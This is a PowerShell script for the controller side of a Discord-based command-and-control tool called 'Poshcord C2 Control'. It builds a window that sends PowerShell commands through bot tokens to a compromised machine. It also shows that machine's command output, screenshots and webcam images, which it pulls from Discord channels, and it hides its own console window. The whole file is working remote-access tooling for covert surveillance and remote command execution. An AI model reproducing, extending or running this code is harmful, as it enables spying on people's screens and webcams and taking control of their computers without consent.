Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# Variables for token and channel IDs
$token = 'TOKEN_1_HERE' # YOUR MAIN BOT TOKEN (USED FOR CLIENT)
$token2 = 'TOKEN_2_HERE' # BOT TO SEND MESSAGES AS USER

$hidewindow = 1
If ($HideWindow -gt 0){
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

function Get-DiscordChannelIDs {
    param([string]$Token)

    $channelNames = @("powershell", "screenshots", "webcam", "session-control")
    $headers = @{
        Authorization = "Bot $Token"
    }
    $guildID = $null
    while (!($guildID)){    
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)    
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        foreach ($guild in $guilds) {
            $guildID = $guild.id
        }
        sleep 3
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    while (!($channelsResponse)){    
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)    
        $response = $wc.DownloadString("https://discord.com/api/guilds/$guildID/channels")
        $channelsResponse = $response | ConvertFrom-Json
        sleep 3
    }

    foreach ($channel in $channelsResponse) {
        if ($channel.name -eq "powershell") {
            $global:PSID = $channel.id
        } elseif ($channel.name -eq "screenshots") {
            $global:ID1 = $channel.id
        } elseif ($channel.name -eq "webcam") {
            $global:ID2 = $channel.id
        } elseif ($channel.name -eq "session-control") {
            $global:ID3 = $channel.id
        }
    }

}

Get-DiscordChannelIDs -Token $token 

$imageUrl = "https://i.ibb.co/ZGrt8qb/b-min.png"
$client = New-Object System.Net.WebClient
$imageBytes = $client.DownloadData($imageUrl)
$ms = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)

$form = New-Object System.Windows.Forms.Form
$form.Text = "Poshcord C2 Control"
$form.Width = 1255
$form.Height = 950
$form.BackColor = "#242424"
$form.BackgroundImage = [System.Drawing.Image]::FromStream($ms, $true)

$TextBoxHeader = New-Object System.Windows.Forms.Label
$TextBoxHeader.Text = "Command Input"
$TextBoxHeader.AutoSize = $true
$TextBoxHeader.ForeColor = "#eeeeee"
$TextBoxHeader.Width = 25
$TextBoxHeader.Height = 10
$TextBoxHeader.Location = New-Object System.Drawing.Point(15, 840)
$TextBoxHeader.Font = 'Microsoft Sans Serif,10,style=Bold'
$form.Controls.Add($TextBoxHeader)

$TextBoxInput = New-Object System.Windows.Forms.TextBox
$TextBoxInput.Location = New-Object System.Drawing.Point(10, 860)
$TextBoxInput.BackColor = "#eeeeee"
$TextBoxInput.Width = 960
$TextBoxInput.Height = 40
$TextBoxInput.Text = ""
$TextBoxInput.Multiline = $false
$TextBoxInput.Font = 'Microsoft Sans Serif,10'
$form.Controls.Add($TextBoxInput)

$Button = New-Object System.Windows.Forms.Button
$Button.Text = "Send"
$Button.Width = 100
$Button.Height = 35
$Button.Location = New-Object System.Drawing.Point(980, 855)
$Button.Font = 'Microsoft Sans Serif,10,style=Bold'
$Button.BackColor = "#eeeeee"
$form.Controls.Add($Button)

$Button2 = New-Object System.Windows.Forms.Button
$Button2.Text = "Close Session"
$Button2.Width = 130
$Button2.Height = 35
$Button2.Location = New-Object System.Drawing.Point(1090, 855)
$Button2.Font = 'Microsoft Sans Serif,10,style=Bold'
$Button2.BackColor = "#eeeeee"
$form.Controls.Add($Button2)

$OutputBoxHeader = New-Object System.Windows.Forms.Label
$OutputBoxHeader.Text = "Powershell Output"
$OutputBoxHeader.AutoSize = $true
$OutputBoxHeader.ForeColor = "#eeeeee"
$OutputBoxHeader.Width = 25
$OutputBoxHeader.Height = 10
$OutputBoxHeader.Location = New-Object System.Drawing.Point(15, 470)
$OutputBoxHeader.Font = 'Microsoft Sans Serif,10,style=Bold'
$form.Controls.Add($OutputBoxHeader)

$OutputBox = New-Object System.Windows.Forms.TextBox 
$OutputBox.Multiline = $True
$OutputBox.Location = New-Object System.Drawing.Size(10,490) 
$OutputBox.Width = 1215
$OutputBox.Height = 340
$OutputBox.Scrollbars = "Vertical" 
$OutputBox.Text = ""
$OutputBox.Font = 'Microsoft Sans Serif,10'
$form.Controls.Add($OutputBox)

$pictureBox1Header = New-Object System.Windows.Forms.Label
$pictureBox1Header.Text = "Screenshots"
$pictureBox1Header.AutoSize = $true
$pictureBox1Header.ForeColor = "#eeeeee"
$pictureBox1Header.Width = 25
$pictureBox1Header.Height = 10
$pictureBox1Header.Location = New-Object System.Drawing.Point(15, 25)
$pictureBox1Header.Font = 'Microsoft Sans Serif,10,style=Bold'
$form.Controls.Add($pictureBox1Header)

$pictureBox2Header = New-Object System.Windows.Forms.Label
$pictureBox2Header.Text = "Webcam Stream"
$pictureBox2Header.AutoSize = $true
$pictureBox2Header.ForeColor = "#eeeeee"
$pictureBox2Header.Width = 25
$pictureBox2Header.Height = 10
$pictureBox2Header.Location = New-Object System.Drawing.Point(630, 25)
$pictureBox2Header.Font = 'Microsoft Sans Serif,10,style=Bold'
$form.Controls.Add($pictureBox2Header)

function Create-ImageForm {
    param ([string]$imagePath1,[string]$imagePath2)

    $pictureBox1 = New-Object System.Windows.Forms.PictureBox
    $pictureBox1.Width = 600
    $pictureBox1.Height = 400
    $pictureBox1.Top = 50
    $pictureBox1.Left = 10
    $pictureBox1.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
    $pictureBox1.ImageLocation = $imagePath1

    $pictureBox2 = New-Object System.Windows.Forms.PictureBox
    $pictureBox2.Width = 600
    $pictureBox2.Height = 400
    $pictureBox2.Top = 50
    $pictureBox2.Left = 620
    $pictureBox2.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
    $pictureBox2.ImageLocation = $imagePath2

    $form.Controls.Add($pictureBox1)
    $form.Controls.Add($pictureBox2)
    return $form, $pictureBox1, $pictureBox2
}

function Update-ImageForm {
    param (
        [string]$imagePath,
        [System.Windows.Forms.PictureBox]$pictureBox
    )

    $pictureBox.ImageLocation = $imagePath
    $pictureBox.Refresh()
}

Function Add-OutputBoxLine{
    Param ($outfeed) 
    $formattedOutfeed = $outfeed -replace "`n", "`r`n"
    $OutputBox.AppendText("`r`n$formattedOutfeed`r`n")
    $OutputBox.Refresh()
    $OutputBox.ScrollToCaret()
}
Add-OutputBoxLine -Outfeed "Starting Connection..."

function sendMsg {
    param([string]$Message,[string]$id)

    $url = "https://discord.com/api/v10/channels/$id/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token2")
    if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
	        $message = $null
    }
}

Function Get-BotUserId {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
    $botInfo = $botInfo | ConvertFrom-Json
    return $botInfo.id
}
$botId = Get-BotUserId

$headers = @{
    'Authorization' = "Bot $token"
}
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("Authorization", $headers.Authorization)

$latestImageUrl1 = ""
$latestImageUrl2 = ""
$imageForm = $null
$pictureBox1 = $null
$pictureBox2 = $null

$imagePath1 = "$env:TEMP\Img1.jpg"
$imagePath2 = "$env:TEMP\Img2.jpg"
$form, $pictureBox1, $pictureBox2 = Create-ImageForm -imagePath1 $imagePath1 -imagePath2 $imagePath2

$form.Add_Shown({ $form.Activate() })
$form.Show()

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 10000

$timer.Add_Tick({
    try {
        $messages1 = $wc.DownloadString("https://discord.com/api/v10/channels/$ID1/messages")
        $messages1 = $messages1 | ConvertFrom-Json
        foreach ($message in $messages1) {
            foreach ($attachment in $message.attachments) {
                if ($attachment.filename -match "\.jpg$") {
                    $imageUrl = $attachment.url
                    if ($imageUrl -ne $latestImageUrl1) {
                        $latestImageUrl1 = $imageUrl
                        $wc.DownloadFile($imageUrl, $imagePath1)
                        Update-ImageForm -imagePath $imagePath1 -pictureBox $pictureBox1
                    }
                    break
                }
            }
            if ($latestImageUrl1 -ne $null) {
                break
            }
        }

        $messages2 = $wc.DownloadString("https://discord.com/api/v10/channels/$ID2/messages")
        $messages2 = $messages2 | ConvertFrom-Json
        foreach ($message in $messages2) {
            foreach ($attachment in $message.attachments) {
                if ($attachment.filename -match "\.jpg$") {
                    $imageUrl = $attachment.url
                    if ($imageUrl -ne $latestImageUrl2) {
                        $latestImageUrl2 = $imageUrl
                        $wc.DownloadFile($imageUrl, $imagePath2)
                        Update-ImageForm -imagePath $imagePath2 -pictureBox $pictureBox2
                    }
                    break
                }
            }
            if ($latestImageUrl2 -ne $null) {
                break
            }
        }
    } catch {
        Write-Error "An error occurred: $_"
    }

    $latestMessageId = $null
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$PSID/messages")
    $messages = $messages | ConvertFrom-Json
    $newMessages = @()
    foreach ($message in $messages) {
        if ($message.timestamp -gt $lastMessageId) {
            if ($message.author.bot -and $message.author.id -eq $botId) {
                $newMessages += $message
            }
        }
    }
    if ($newMessages.Count -gt 0) {
        $latestMessageId = ($newMessages | Sort-Object -Property timestamp -Descending)[0].timestamp
        $script:lastMessageId = $latestMessageId
        $sortedNewMessages = $newMessages | Sort-Object -Property timestamp
        foreach ($message in $sortedNewMessages) {
            Add-OutputBoxLine -Outfeed $message.content
        }
    }
})


$button.Add_Click({

$msgtosend = $TextBoxInput.Text
sendMsg -Message $msgtosend -id $PSID
})

$button2.Add_Click({

$msgtosend = $TextBoxInput.Text
sendMsg -Message 'close' -id $ID3
sleep 3
$form.Close()
sleep 1
exit

})

$timer.Start()
[System.Windows.Forms.Application]::Run($form)
